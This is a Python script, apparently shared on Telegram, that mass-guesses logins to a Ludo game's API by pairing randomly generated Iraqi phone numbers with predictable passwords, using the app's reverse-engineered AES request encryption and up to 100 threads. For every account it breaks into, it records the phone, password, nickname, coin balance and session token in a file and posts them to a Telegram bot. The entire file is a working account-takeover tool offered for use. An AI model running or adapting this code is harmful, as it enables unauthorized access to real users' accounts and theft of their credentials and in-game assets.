import subprocess
import sys
import os

def install_packages():
    packages = ['requests', 'pycryptodome']
    for pkg in packages:
        try:
            __import__(pkg)
        except:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

install_packages()

import os, sys, requests, random, json, time, uuid, webbrowser, base64, hashlib
from concurrent.futures import ThreadPoolExecutor as r
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

GOLD = '\033[1;93m'
YELLOW = '\033[1;93m'
GREEN = '\033[1;32m'
RED = '\033[1;31m'
BLUE = '\033[1;34m'
CYAN = '\x1b[1;96m'
WHITE = '\033[1;37m'
RESET = '\033[0m'

Logo = f"""
{GOLD}   ███████╗██╗  ██╗██╗  ██╗ ██████╗ ███╗   ███╗
{YELLOW}   ██╔════╝██║  ██║██║  ██║██╔═══██╗████╗ ████║
{GOLD}   ███████╗███████║███████║██║   ██║██╔████╔██║
{YELLOW}   ╚════██║██╔══██║██╔══██║██║   ██║██║╚██╔╝██║
{GOLD}   ███████║██║  ██║██║  ██║╚██████╔╝██║ ╚═╝ ██║
{YELLOW}   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝
{GOLD}   ██╗   ██╗██╗██████╗ ██╗   ██╗██╗  ██╗
{YELLOW}   ██║   ██║██║██╔══██╗██║   ██║╚██╗██╔╝
{GOLD}   ██║   ██║██║██║  ██║██║   ██║ ╚███╔╝ 
{YELLOW}   ╚██╗ ██╔╝██║██║  ██║██║   ██║ ██╔██╗ 
{GOLD}    ╚████╔╝ ██║██████╔╝╚██████╔╝██╔╝ ██╗
{YELLOW}     ╚═══╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
{WHITE}   ╔════════════════════════════════════════════════════════════╗
{WHITE}   ║            {GOLD}SHLHOM LUDO CHECKER{GOLD}                  ║
{WHITE}   ║         {YELLOW}Developer: @Fp_h9{YELLOW}                         ║
{WHITE}   ║         {GOLD}Channel: @shllhom{GOLD}                  ║
{WHITE}   ╚════════════════════════════════════════════════════════════╝
"""

base_key = "U71u7otqvAUCPoUJ"
sha384_bytes = hashlib.sha384(base_key.encode('utf-8')).digest()
aes_key = sha384_bytes[0:32]
aes_iv = sha384_bytes[32:48]

TOKEN = ""
CHAT_ID = ""

def encrypt_request(data):
    json_string = json.dumps(data, separators=(',', ':'))
    padded_data = pad(json_string.encode('utf-8'), AES.block_size)
    cipher_encrypt = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    encrypted_bytes = cipher_encrypt.encrypt(padded_data)
    return base64.b64encode(encrypted_bytes).decode('utf-8')

def decrypt_response(encrypted_response):
    raw_encrypted_response = base64.b64decode(encrypted_response)
    cipher_decrypt = AES.new(aes_key, AES.MODE_CBC, aes_iv)
    decrypted_response_bytes = cipher_decrypt.decrypt(raw_encrypted_response)
    return unpad(decrypted_response_bytes, AES.block_size).decode('utf-8')

def check_ludo_account(phone, password):
    try:
        new_data = {
            "common": {
                "device_name": "",
                "user_lang": 2,
                "platform": 2,
                "version": "215961"
            },
            "data": {
                "phone_code": "",
                "telephone": phone,
                "password": password
            }
        }
        
        request_data_encoded = encrypt_request(new_data)
        
        url = "https://api2.goldenld.com/api/user/login"
        payload = {"request_data": request_data_encoded}
        headers = {
            'User-Agent': "okhttp/5.1.0",
            'Accept-Encoding': "gzip",
            'x-uid': "",
            'content-type': "application/json; charset=utf-8"
        }
        
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
        encrypted_response_raw = response.text.strip().strip('"')
        decrypted_response_text = decrypt_response(encrypted_response_raw)
        res_json = json.loads(decrypted_response_text)
        
        code = res_json.get("code")
        
        if code == 0:
            return True, res_json
        elif code == 10002:
            return False, "كلمة مرور خاطئة"
        elif code == 50004:
            return False, "الحساب غير موجود"
        else:
            return False, f"كود غير معروف: {code}"
            
    except Exception as e:
        return False, str(e)

def send_telegram(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                     data={"chat_id": CHAT_ID, "text": msg}, timeout=10)
    except:
        pass

def menu():
    global TOKEN, CHAT_ID
    os.system('clear')
    print(Logo)
    print(f'{CYAN}='*45)
    print(f' {YELLOW}[!] يرجى إدخال توكن البوت والايدي{RESET}')
    print(f'{CYAN}='*45)
    
    TOKEN = input(f' {GREEN}[?]{CYAN} ادخل التوكن: {RESET}')
    CHAT_ID = input(f' {GREEN}[?]{CYAN} ادخل الايدي: {RESET}')
    
    if not TOKEN or not CHAT_ID:
        print(f'{RED}❌ التوكن والايدي مطلوبين!{RESET}')
        sys.exit()
    
    os.system('clear')
    print(Logo)
    print(f'{CYAN}='*45)
    print(f' {GREEN}[1]{WHITE} >{GREEN} تشغيل صيد لودو')
    print(f'{CYAN}='*45)
    
    choice = input(f' {GREEN}[?]{CYAN} اختر: {RESET}')
    
    if choice == '1':
        run_hunter()
    else:
        print(f'{RED}اختيار خاطئ!{RESET}')
        sys.exit()

def run_hunter():
    global ok, loop, cp
    ok, loop, cp = 0, 0, 0
    
    print(f'{GREEN}بدأ الصيد...{RESET}')
    print(f'{CYAN}الرجاء اختيار نوع الأرقام:{RESET}')
    print(f' {GREEN}[1]{WHITE} >{GREEN} 0770 (Asiacell)')
    print(f' {GREEN}[2]{WHITE} >{RED} 0780 (Zain)')
    print(f' {GREEN}[3]{WHITE} >{BLUE} 0750 (Korek)')
    print(f' {GREEN}[4]{WHITE} >{CYAN} 0751 (?)')
    print(f' {GREEN}[5]{WHITE} >{YELLOW} 0781 (?)')
    
    sim_choice = input(f' {GREEN}[?]{CYAN} اختر: {RESET}')
    
    sim_map = {
        '1': '0770', '2': '0780', '3': '0750',
        '4': '0751', '5': '0781'
    }
    
    if sim_choice not in sim_map:
        print(f'{RED}اختيار خاطئ!{RESET}')
        sys.exit()
    
    sim = sim_map[sim_choice]
    
    print(f'{GREEN}كم عدد الأرقام التي تريد فحصها؟{RESET}')
    try:
        count = int(input(f' {GREEN}[?]{CYAN} العدد: {RESET}'))
        if count > 100000:
            count = 100000
    except:
        count = 1000
    
    print(f'{GREEN}عدد الخيوط (Threads)؟{RESET}')
    try:
        threads = int(input(f' {GREEN}[?]{CYAN} الخيوط: {RESET}'))
        if threads > 100:
            threads = 100
    except:
        threads = 10
    
    generated = set()
    id_list = []
    
    print(f'{GREEN}جاري توليد الأرقام...{RESET}')
    while len(generated) < count:
        nmp = "".join(random.choice('1234509876') for _ in range(7))
        if nmp not in generated:
            generated.add(nmp)
            id_list.append(nmp)
    
    print(f'{GREEN}بدء الفحص باستخدام {threads} خيط...{RESET}')
    
    with r(max_workers=threads) as am:
        for idx in id_list:
            phone = sim + str(idx)
            password = '077' + str(idx)
            am.submit(check_account, phone, password)
    
    print(f'\n{WHITE}{"-"*45}{RESET}')
    print(f'{GREEN}✅ انتهى الفحص!{RESET}')
    print(f'{GREEN}✅ OK: {ok}{RESET}')
    print(f'{RED}❌ FAIL: {cp}{RESET}')
    input(f'\n{GREEN}اضغط Enter للخروج...{RESET}')

def check_account(phone, password):
    global ok, cp
    sys.stdout.write(f'\r\r\r {CYAN} [ SHLHOM ] {BLUE}OK:{WHITE}{ok} {WHITE}> {YELLOW}FAIL:{WHITE}{cp} {RESET}')
    sys.stdout.flush()
    
    success, result = check_ludo_account(phone, password)
    
    if success:
        ok += 1
        data = result['data']
        nickname = data['user']['nickname']
        coin = data['user']['coin']
        token = data['token']
        
        msg = f"""
╔══════════════════════════╗
        SHLHOM LUDO OK ✅
╚══════════════════════════╝

(𖣘) >  الهاتف : {phone}
(𖣘) >  كلمة السر : {password}
(𖣘) >  الاسم : {nickname}
(𖣘) >  العملات : {coin}
(𖣘) >  التوكن : {token[:50]}...

(𖣘) >  القناة : @shllhom
(𖣘) >  المطور : @Fp_h9
"""
        print(f'\r{GREEN}[SHLHOM-OK] {phone} | {password} | {nickname} | {coin}⭐{RESET}')
        open('LUDO_OK.txt', 'a', encoding='utf-8').write(f'{phone}|{password}|{nickname}|{coin}|{token}\n')
        send_telegram(msg)
    else:
        cp += 1
        if 'غير موجود' in result:
            print(f'\r{RED}[SHLHOM-NOT] {phone} | {password}{RESET}')
        else:
            print(f'\r{YELLOW}[SHLHOM-FAIL] {phone} | {password} - {result}{RESET}')

if __name__ == "__main__":
    webbrowser.open('https://t.me/shllhom')
    menu()